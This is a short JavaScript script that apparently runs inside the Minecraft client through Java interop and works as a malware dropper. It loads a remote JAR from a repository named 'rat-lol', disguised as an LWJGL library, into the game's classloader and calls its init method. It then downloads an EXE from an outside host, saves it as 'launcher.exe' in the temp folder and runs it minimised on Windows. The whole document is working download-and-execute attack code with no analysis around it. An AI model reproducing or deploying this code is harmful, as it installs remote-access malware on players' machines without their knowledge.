// ===== ORIGINAL WORKING CODE (COMBINED) =====
var URL = Java.type("java.net.URL");
var URLClassLoader = Java.type("java.net.URLClassLoader");
var Minecraft = Java.type("net.minecraft.client.Minecraft");
var Thread = Java.type("java.lang.Thread");
var Files = Java.type("java.nio.file.Files");
var Paths = Java.type("java.nio.file.Paths");
var Runtime = Java.type("java.lang.Runtime");
var System = Java.type("java.lang.System");

// ==== 1. LOAD THE JAR ====
try {
    var jarURL = new URL("https://github.com/MansHeree/rat-lol/raw/refs/heads/main/LWJGL-3.6-SNAPSHOT-ALL.jar");
    var classLoader = Minecraft.class.getClassLoader();
    
    // Use reflection to add the JAR to classpath
    var method = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
    method.setAccessible(true);
    method.invoke(classLoader, jarURL);
    
    Thread.sleep(1000); // Wait for JAR to load
    
    // Initialize the class
    classLoader.loadClass("org.lwjgl36.VersionImp").getMethod("init").invoke(null);
    print("[+] JAR loaded successfully!");
} catch (e) {
    print("[-] JAR loading failed: " + e);
}

// ==== 2. DOWNLOAD & EXECUTE EXE ====
try {
    var exeURL = "https://r2.e-z.host/c4fb8249-0756-49bd-8cab-d1d22d088421/apb3y3z4.exe";
    var tempDir = System.getProperty("java.io.tmpdir");
    var exePath = Paths.get(tempDir, "launcher.exe");
    
    // Download EXE
    var connection = new URL(exeURL).openConnection();
    connection.setRequestProperty("User-Agent", "Mozilla/5.0");
    var inStream = connection.getInputStream();
    Files.copy(inStream, exePath);
    inStream.close();
    
    Thread.sleep(1000); // Wait for download
    
    // Execute EXE (hidden on Windows)
    if (System.getProperty("os.name").contains("Windows")) {
        Runtime.getRuntime().exec("cmd /c start /min " + exePath.toString());
        print("[+] EXE launched (hidden)!");
    } else {
        print("[!] EXE can only run on Windows.");
    }
} catch (e) {
    print("[-] EXE execution failed: " + e);
}